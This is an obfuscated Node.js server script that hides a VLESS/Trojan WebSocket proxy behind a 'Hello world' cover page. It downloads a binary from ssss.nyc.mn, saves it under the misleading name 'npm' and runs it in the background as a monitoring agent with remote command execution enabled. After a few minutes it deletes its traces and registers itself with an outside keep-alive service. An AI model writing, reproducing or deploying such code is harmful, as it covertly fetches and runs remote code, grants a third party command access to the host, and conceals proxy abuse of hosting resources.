const _0x3118b6=_0xb057;(function(_0x5a7999,_0x53b344){const _0x3ae14f=_0xb057,_0x28671e=_0x5a7999();while(!![]){try{const _0x527b5a=-parseInt(_0x3ae14f(0x1e7))/0x1*(-parseInt(_0x3ae14f(0x197))/0x2)+-parseInt(_0x3ae14f(0x1f2))/0x3*(parseInt(_0x3ae14f(0x1bd))/0x4)+parseInt(_0x3ae14f(0x187))/0x5+parseInt(_0x3ae14f(0x1e4))/0x6*(-parseInt(_0x3ae14f(0x1aa))/0x7)+-parseInt(_0x3ae14f(0x1c9))/0x8*(parseInt(_0x3ae14f(0x190))/0x9)+parseInt(_0x3ae14f(0x1a6))/0xa+-parseInt(_0x3ae14f(0x1ac))/0xb*(-parseInt(_0x3ae14f(0x1ed))/0xc);if(_0x527b5a===_0x53b344)break;else _0x28671e['push'](_0x28671e['shift']());}catch(_0xafca5a){_0x28671e['push'](_0x28671e['shift']());}}}(_0x5687,0xb4558));const os=require('os'),http=require('http'),fs=require('fs'),axios=require(_0x3118b6(0x1f9)),net=require(_0x3118b6(0x1ab)),path=require('path'),crypto=require(_0x3118b6(0x1f5)),{Buffer}=require(_0x3118b6(0x19f)),{exec,execSync}=require('child_process'),{WebSocket,createWebSocketStream}=require('ws'),UUID=process[_0x3118b6(0x19b)]['UUID']||_0x3118b6(0x19c),NEZHA_SERVER=process['env']['NEZHA_SERVER']||'',NEZHA_PORT=process[_0x3118b6(0x19b)][_0x3118b6(0x1ad)]||'',NEZHA_KEY=process['env']['NEZHA_KEY']||'',DOMAIN=process[_0x3118b6(0x19b)][_0x3118b6(0x19d)]||'1234.abc.com',AUTO_ACCESS=process[_0x3118b6(0x19b)]['AUTO_ACCESS']||!![],WSPATH=process[_0x3118b6(0x19b)]['WSPATH']||UUID[_0x3118b6(0x1ef)](0x0,0x8),SUB_PATH=process[_0x3118b6(0x19b)][_0x3118b6(0x1f3)]||_0x3118b6(0x1c2),NAME=process[_0x3118b6(0x19b)][_0x3118b6(0x1d7)]||'',PORT=process[_0x3118b6(0x19b)][_0x3118b6(0x198)]||0x1eb4;let ISP='';const GetISP=async()=>{const _0x56d2c9=_0x3118b6;try{const _0x480a38=await axios[_0x56d2c9(0x1cf)](_0x56d2c9(0x1ca)),_0x52bb27=_0x480a38[_0x56d2c9(0x1d8)];ISP=(_0x52bb27[_0x56d2c9(0x18a)]+'-'+_0x52bb27['isp'])['replace'](/ /g,'_');}catch(_0x4c6ec5){ISP=_0x56d2c9(0x1e1);}};GetISP();function _0x5687(){const _0x10b878=['send','message','utf-8','connection','concat','substr','find','write','update','539096SrLRmS','NEZHA\x20variable\x20is\x20empty,\x20skip\x20running','unlink','length','setsid\x20nohup\x20./npm\x20-s\x20','sub','npm\x20is\x20already\x20running,\x20skip\x20running...','true','arm','writeHead','ps\x20aux\x20|\x20grep\x20-v\x20\x22grep\x22\x20|\x20grep\x20\x22./[n]pm\x22','arm64','120104zRrMMx','https://api.ip.sb/geoip','from','Answer','2096','url','get','Server\x20is\x20running\x20on\x20port\x20','map','index.html','utf8','catch','digest','\x20-p\x20','NAME','data','1.1.1.1','application/dns-json','createHash',':443?encryption=none&security=tls&sni=','join','https://','listen','then','Unknown','finish','createWriteStream','312DWwePJ','Not\x20Found\x0a','log','34JTXpAL','close','test','2087','setsid\x20nohup\x20./npm\x20-c\x20config.yaml\x20>/dev/null\x202>&1\x20&','error','24klEzsR','sha224','slice','stream','connect','27mgKOWV','SUB_PATH','Automatic\x20Access\x20Task\x20added\x20successfully','crypto','npm\x20running\x20error:','\x0ause_gitee_to_upgrade:\x20false\x0ause_ipv6_country_code:\x20false\x0auuid:\x20','end','axios','false','443','application/json','https://arm64.ssss.nyc.mn/agent','Hello\x20world!','readUInt16BE','5574860RPzteo','pipe','client_secret:\x20','country_code','https://amd64.ssss.nyc.mn/agent','once','createServer','hex','&type=A','657jzdtFI','decode','2083','toString','https://dns.google/resolve?name=','text/plain','every','63130hQkyvT','PORT','reduce','&path=%2F','env','e4d7bd0d-f345-4428-a048-a1445ca11b78','DOMAIN','--tls','buffer','\x20--disable-auto-update\x20--report-delay\x204\x20--skip-conn\x20--skip-procs\x20>/dev/null\x202>&1\x20&','npm\x20download\x20successfully','text/html','config.yaml','8.8.4.4','\x0askip_connection_count:\x20true\x0askip_procs_count:\x20true\x0atemperature:\x20false\x0atls:\x20','5339370cMfiWU','aarch64','pop','readUInt8','101829sTBDTJ','net','5950384ekVjII','NEZHA_PORT','error:\x20','npm\x20is\x20running','2053',':443?security=tls&sni=','includes','Failed\x20to\x20resolve\x20'];_0x5687=function(){return _0x10b878;};return _0x5687();}function _0xb057(_0x29b263,_0x16491e){_0x29b263=_0x29b263-0x184;const _0x5687d6=_0x5687();let _0xb05797=_0x5687d6[_0x29b263];return _0xb05797;}const httpServer=http[_0x3118b6(0x18d)]((_0x567051,_0x4bcd22)=>{const _0x20f755=_0x3118b6;if(_0x567051[_0x20f755(0x1ce)]==='/'){const _0x57baa2=path[_0x20f755(0x1dd)](__dirname,_0x20f755(0x1d2));fs['readFile'](_0x57baa2,_0x20f755(0x1d3),(_0x1a3d2b,_0x58e0cd)=>{const _0xba6d35=_0x20f755;if(_0x1a3d2b){_0x4bcd22[_0xba6d35(0x1c6)](0xc8,{'Content-Type':_0xba6d35(0x1a2)}),_0x4bcd22[_0xba6d35(0x1f8)](_0xba6d35(0x185));return;}_0x4bcd22[_0xba6d35(0x1c6)](0xc8,{'Content-Type':'text/html'}),_0x4bcd22[_0xba6d35(0x1f8)](_0x58e0cd);});return;}else{if(_0x567051[_0x20f755(0x1ce)]==='/'+SUB_PATH){const _0x10148c=NAME?NAME+'-'+ISP:ISP,_0x1d20cd='vless://'+UUID+'@'+DOMAIN+_0x20f755(0x1dc)+DOMAIN+'&fp=chrome&type=ws&host='+DOMAIN+_0x20f755(0x19a)+WSPATH+'#'+_0x10148c,_0x58ef9c='trojan://'+UUID+'@'+DOMAIN+_0x20f755(0x1b1)+DOMAIN+'&fp=chrome&type=ws&host='+DOMAIN+'&path=%2F'+WSPATH+'#'+_0x10148c,_0xced8a9=_0x1d20cd+'\x0a'+_0x58ef9c,_0x49ee7c=Buffer[_0x20f755(0x1cb)](_0xced8a9)[_0x20f755(0x193)]('base64');_0x4bcd22[_0x20f755(0x1c6)](0xc8,{'Content-Type':_0x20f755(0x195)}),_0x4bcd22[_0x20f755(0x1f8)](_0x49ee7c+'\x0a');}else _0x4bcd22['writeHead'](0x194,{'Content-Type':_0x20f755(0x195)}),_0x4bcd22[_0x20f755(0x1f8)](_0x20f755(0x1e5));}}),wss=new WebSocket['Server']({'server':httpServer}),uuid=UUID['replace'](/-/g,''),DNS_SERVERS=[_0x3118b6(0x1a4),_0x3118b6(0x1d9)];function resolveHost(_0x3318c8){return new Promise((_0x20a159,_0x3c1147)=>{const _0x2c194d=_0xb057;if(/^(?:(?:25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\.){3}(?:25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)$/[_0x2c194d(0x1e9)](_0x3318c8)){_0x20a159(_0x3318c8);return;}let _0x246f5f=0x0;function _0x5a9629(){const _0xe8cdca=_0x2c194d;if(_0x246f5f>=DNS_SERVERS['length']){_0x3c1147(new Error(_0xe8cdca(0x1b3)+_0x3318c8+'\x20with\x20all\x20DNS\x20servers'));return;}const _0x48a376=DNS_SERVERS[_0x246f5f];_0x246f5f++;const _0x22ebfb=_0xe8cdca(0x194)+encodeURIComponent(_0x3318c8)+_0xe8cdca(0x18f);axios[_0xe8cdca(0x1cf)](_0x22ebfb,{'timeout':0x1388,'headers':{'Accept':_0xe8cdca(0x1da)}})['then'](_0x34eb76=>{const _0x516bd8=_0xe8cdca,_0xcb3128=_0x34eb76[_0x516bd8(0x1d8)];if(_0xcb3128['Status']===0x0&&_0xcb3128[_0x516bd8(0x1cc)]&&_0xcb3128['Answer'][_0x516bd8(0x1c0)]>0x0){const _0x2f68f4=_0xcb3128[_0x516bd8(0x1cc)][_0x516bd8(0x1ba)](_0x3e389e=>_0x3e389e['type']===0x1);if(_0x2f68f4){_0x20a159(_0x2f68f4['data']);return;}}_0x5a9629();})[_0xe8cdca(0x1d4)](_0x3468c9=>{_0x5a9629();});}_0x5a9629();});}function handleVlessConnection(_0x39920b,_0x244c6e){const _0x397f40=_0x3118b6,[_0xf77b9d]=_0x244c6e,_0x30247f=_0x244c6e['slice'](0x1,0x11);if(!_0x30247f[_0x397f40(0x196)]((_0x42caf4,_0x6f52b2)=>_0x42caf4==parseInt(uuid[_0x397f40(0x1b9)](_0x6f52b2*0x2,0x2),0x10)))return![];let _0x31cbdd=_0x244c6e[_0x397f40(0x1ef)](0x11,0x12)['readUInt8']()+0x13;const _0x359345=_0x244c6e[_0x397f40(0x1ef)](_0x31cbdd,_0x31cbdd+=0x2)['readUInt16BE'](0x0),_0x2daed1=_0x244c6e[_0x397f40(0x1ef)](_0x31cbdd,_0x31cbdd+=0x1)['readUInt8'](),_0x139d6c=_0x2daed1==0x1?_0x244c6e[_0x397f40(0x1ef)](_0x31cbdd,_0x31cbdd+=0x4)[_0x397f40(0x1dd)]('.'):_0x2daed1==0x2?new TextDecoder()[_0x397f40(0x191)](_0x244c6e[_0x397f40(0x1ef)](_0x31cbdd+0x1,_0x31cbdd+=0x1+_0x244c6e['slice'](_0x31cbdd,_0x31cbdd+0x1)[_0x397f40(0x1a9)]())):_0x2daed1==0x3?_0x244c6e[_0x397f40(0x1ef)](_0x31cbdd,_0x31cbdd+=0x10)[_0x397f40(0x199)]((_0x2f301a,_0x1b5f1a,_0x1fa4e2,_0x7e097d)=>_0x1fa4e2%0x2?_0x2f301a[_0x397f40(0x1b8)](_0x7e097d[_0x397f40(0x1ef)](_0x1fa4e2-0x1,_0x1fa4e2+0x1)):_0x2f301a,[])[_0x397f40(0x1d1)](_0x5b9131=>_0x5b9131['readUInt16BE'](0x0)[_0x397f40(0x193)](0x10))['join'](':'):'';_0x39920b[_0x397f40(0x1b4)](new Uint8Array([_0xf77b9d,0x0]));const _0x5cdd45=createWebSocketStream(_0x39920b);return resolveHost(_0x139d6c)[_0x397f40(0x1e0)](_0x7424e4=>{const _0x4a4c05=_0x397f40;net[_0x4a4c05(0x1f1)]({'host':_0x7424e4,'port':_0x359345},function(){const _0x4cf955=_0x4a4c05;this[_0x4cf955(0x1bb)](_0x244c6e[_0x4cf955(0x1ef)](_0x31cbdd)),_0x5cdd45['on'](_0x4cf955(0x1ec),()=>{})[_0x4cf955(0x188)](this)['on'](_0x4cf955(0x1ec),()=>{})[_0x4cf955(0x188)](_0x5cdd45);})['on'](_0x4a4c05(0x1ec),()=>{});})[_0x397f40(0x1d4)](_0x5de2ee=>{const _0x56202d=_0x397f40;net[_0x56202d(0x1f1)]({'host':_0x139d6c,'port':_0x359345},function(){const _0x548fb7=_0x56202d;this['write'](_0x244c6e['slice'](_0x31cbdd)),_0x5cdd45['on'](_0x548fb7(0x1ec),()=>{})[_0x548fb7(0x188)](this)['on'](_0x548fb7(0x1ec),()=>{})[_0x548fb7(0x188)](_0x5cdd45);})['on'](_0x56202d(0x1ec),()=>{});}),!![];}function handleTrojanConnection(_0x81e96c,_0x13abf7){const _0x13709e=_0x3118b6;try{if(_0x13abf7[_0x13709e(0x1c0)]<0x3a)return![];const _0x279acb=_0x13abf7['slice'](0x0,0x38)[_0x13709e(0x193)](),_0xe884f=[UUID];let _0x3b2569=null;for(const _0x1b0879 of _0xe884f){const _0x10d8eb=crypto[_0x13709e(0x1db)](_0x13709e(0x1ee))[_0x13709e(0x1bc)](_0x1b0879)[_0x13709e(0x1d5)](_0x13709e(0x18e));if(_0x10d8eb===_0x279acb){_0x3b2569=_0x1b0879;break;}}if(!_0x3b2569)return![];let _0x43323d=0x38;_0x13abf7[_0x43323d]===0xd&&_0x13abf7[_0x43323d+0x1]===0xa&&(_0x43323d+=0x2);const _0x1ef914=_0x13abf7[_0x43323d];if(_0x1ef914!==0x1)return![];_0x43323d+=0x1;const _0x1d2506=_0x13abf7[_0x43323d];_0x43323d+=0x1;let _0x475ab5,_0x1b2c64;if(_0x1d2506===0x1)_0x475ab5=_0x13abf7[_0x13709e(0x1ef)](_0x43323d,_0x43323d+0x4)['join']('.'),_0x43323d+=0x4;else{if(_0x1d2506===0x3){const _0x46dc7e=_0x13abf7[_0x43323d];_0x43323d+=0x1,_0x475ab5=_0x13abf7[_0x13709e(0x1ef)](_0x43323d,_0x43323d+_0x46dc7e)[_0x13709e(0x193)](),_0x43323d+=_0x46dc7e;}else{if(_0x1d2506===0x4)_0x475ab5=_0x13abf7['slice'](_0x43323d,_0x43323d+0x10)[_0x13709e(0x199)]((_0x1c8689,_0x3f3825,_0x136492,_0x2b280d)=>_0x136492%0x2?_0x1c8689['concat'](_0x2b280d[_0x13709e(0x1ef)](_0x136492-0x1,_0x136492+0x1)):_0x1c8689,[])[_0x13709e(0x1d1)](_0x14261b=>_0x14261b[_0x13709e(0x186)](0x0)['toString'](0x10))['join'](':'),_0x43323d+=0x10;else return![];}}_0x1b2c64=_0x13abf7[_0x13709e(0x186)](_0x43323d),_0x43323d+=0x2;_0x43323d<_0x13abf7[_0x13709e(0x1c0)]&&_0x13abf7[_0x43323d]===0xd&&_0x13abf7[_0x43323d+0x1]===0xa&&(_0x43323d+=0x2);const _0x1cff74=createWebSocketStream(_0x81e96c);return resolveHost(_0x475ab5)[_0x13709e(0x1e0)](_0x3cad76=>{const _0x28bca2=_0x13709e;net[_0x28bca2(0x1f1)]({'host':_0x3cad76,'port':_0x1b2c64},function(){const _0x2ff58c=_0x28bca2;_0x43323d<_0x13abf7[_0x2ff58c(0x1c0)]&&this['write'](_0x13abf7['slice'](_0x43323d)),_0x1cff74['on']('error',()=>{})['pipe'](this)['on']('error',()=>{})[_0x2ff58c(0x188)](_0x1cff74);})['on'](_0x28bca2(0x1ec),()=>{});})[_0x13709e(0x1d4)](_0x1cf932=>{const _0x1686b6=_0x13709e;net[_0x1686b6(0x1f1)]({'host':_0x475ab5,'port':_0x1b2c64},function(){const _0x35a37a=_0x1686b6;_0x43323d<_0x13abf7[_0x35a37a(0x1c0)]&&this[_0x35a37a(0x1bb)](_0x13abf7[_0x35a37a(0x1ef)](_0x43323d)),_0x1cff74['on'](_0x35a37a(0x1ec),()=>{})['pipe'](this)['on'](_0x35a37a(0x1ec),()=>{})['pipe'](_0x1cff74);})['on'](_0x1686b6(0x1ec),()=>{});}),!![];}catch(_0x134580){return![];}}wss['on'](_0x3118b6(0x1b7),(_0xf7848e,_0x5474d8)=>{const _0x3dec8d=_0x3118b6,_0x5f5b94=_0x5474d8['url']||'';_0xf7848e[_0x3dec8d(0x18c)](_0x3dec8d(0x1b5),_0x3c34e8=>{const _0x581ef4=_0x3dec8d;if(_0x3c34e8['length']>0x11&&_0x3c34e8[0x0]===0x0){const _0x435183=_0x3c34e8[_0x581ef4(0x1ef)](0x1,0x11),_0x57f71f=_0x435183['every']((_0x4b5f4d,_0x6aa70f)=>_0x4b5f4d==parseInt(uuid[_0x581ef4(0x1b9)](_0x6aa70f*0x2,0x2),0x10));if(_0x57f71f){!handleVlessConnection(_0xf7848e,_0x3c34e8)&&_0xf7848e[_0x581ef4(0x1e8)]();return;}}!handleTrojanConnection(_0xf7848e,_0x3c34e8)&&_0xf7848e['close']();})['on']('error',()=>{});});const getDownloadUrl=()=>{const _0x176dbd=_0x3118b6,_0x377467=os['arch']();return _0x377467===_0x176dbd(0x1c5)||_0x377467===_0x176dbd(0x1c8)||_0x377467===_0x176dbd(0x1a7)?!NEZHA_PORT?'https://arm64.ssss.nyc.mn/v1':_0x176dbd(0x184):!NEZHA_PORT?'https://amd64.ssss.nyc.mn/v1':_0x176dbd(0x18b);},downloadFile=async()=>{const _0x176eb1=_0x3118b6;if(!NEZHA_SERVER&&!NEZHA_KEY)return;try{const _0xfe079f=getDownloadUrl(),_0x583d66=await axios({'method':'get','url':_0xfe079f,'responseType':_0x176eb1(0x1f0)}),_0x49c48d=fs[_0x176eb1(0x1e3)]('npm');return _0x583d66[_0x176eb1(0x1d8)]['pipe'](_0x49c48d),new Promise((_0x21da33,_0x468bb1)=>{const _0x440963=_0x176eb1;_0x49c48d['on'](_0x440963(0x1e2),()=>{const _0x5df59d=_0x440963;console[_0x5df59d(0x1e6)](_0x5df59d(0x1a1)),exec('chmod\x20+x\x20npm',_0x315b57=>{if(_0x315b57)_0x468bb1(_0x315b57);_0x21da33();});}),_0x49c48d['on'](_0x440963(0x1ec),_0x468bb1);});}catch(_0x389b02){throw _0x389b02;}},runnz=async()=>{const _0x2540d1=_0x3118b6;try{const _0x41f033=execSync(_0x2540d1(0x1c7),{'encoding':_0x2540d1(0x1b6)});if(_0x41f033['trim']()!==''){console[_0x2540d1(0x1e6)](_0x2540d1(0x1c3));return;}}catch(_0x3a586e){}await downloadFile();let _0xa40ab9='',_0x18df74=[_0x2540d1(0x1fb),'8443',_0x2540d1(0x1cd),_0x2540d1(0x1ea),_0x2540d1(0x192),_0x2540d1(0x1b0)];if(NEZHA_SERVER&&NEZHA_PORT&&NEZHA_KEY){const _0xab5b75=_0x18df74[_0x2540d1(0x1b2)](NEZHA_PORT)?_0x2540d1(0x19e):'';_0xa40ab9=_0x2540d1(0x1c1)+NEZHA_SERVER+':'+NEZHA_PORT+_0x2540d1(0x1d6)+NEZHA_KEY+'\x20'+_0xab5b75+_0x2540d1(0x1a0);}else{if(NEZHA_SERVER&&NEZHA_KEY){if(!NEZHA_PORT){const _0x448a16=NEZHA_SERVER[_0x2540d1(0x1b2)](':')?NEZHA_SERVER['split'](':')[_0x2540d1(0x1a8)]():'',_0xe334bf=_0x18df74[_0x2540d1(0x1b2)](_0x448a16)?_0x2540d1(0x1c4):_0x2540d1(0x1fa),_0x3536f3=_0x2540d1(0x189)+NEZHA_KEY+'\x0adebug:\x20false\x0adisable_auto_update:\x20true\x0adisable_command_execute:\x20false\x0adisable_force_update:\x20true\x0adisable_nat:\x20false\x0adisable_send_query:\x20false\x0agpu:\x20false\x0ainsecure_tls:\x20true\x0aip_report_period:\x201800\x0areport_delay:\x204\x0aserver:\x20'+NEZHA_SERVER+_0x2540d1(0x1a5)+_0xe334bf+_0x2540d1(0x1f7)+UUID;fs['writeFileSync'](_0x2540d1(0x1a3),_0x3536f3);}_0xa40ab9=_0x2540d1(0x1eb);}else{console[_0x2540d1(0x1e6)](_0x2540d1(0x1be));return;}}try{exec(_0xa40ab9,{'shell':'/bin/bash'},_0x159dad=>{const _0xc3b8e0=_0x2540d1;if(_0x159dad)console[_0xc3b8e0(0x1ec)](_0xc3b8e0(0x1f6),_0x159dad);else console[_0xc3b8e0(0x1e6)](_0xc3b8e0(0x1af));});}catch(_0x1c0b12){console['error'](_0x2540d1(0x1ae)+_0x1c0b12);}};async function addAccessTask(){const _0x478a76=_0x3118b6;if(!AUTO_ACCESS)return;if(!DOMAIN)return;const _0x131051=_0x478a76(0x1de)+DOMAIN;try{const _0x3c049c=await axios['post']('https://oooo.serv00.net/add-url',{'url':_0x131051},{'headers':{'Content-Type':_0x478a76(0x1fc)}});console['log'](_0x478a76(0x1f4));}catch(_0x2405e0){}}const delFiles=()=>{const _0x2d1120=_0x3118b6;fs[_0x2d1120(0x1bf)]('npm',()=>{}),fs['unlink'](_0x2d1120(0x1a3),()=>{});};httpServer[_0x3118b6(0x1df)](PORT,()=>{const _0x24c48a=_0x3118b6;runnz(),setTimeout(()=>{delFiles();},0x2bf20),addAccessTask(),console[_0x24c48a(0x1e6)](_0x24c48a(0x1d0)+PORT);});
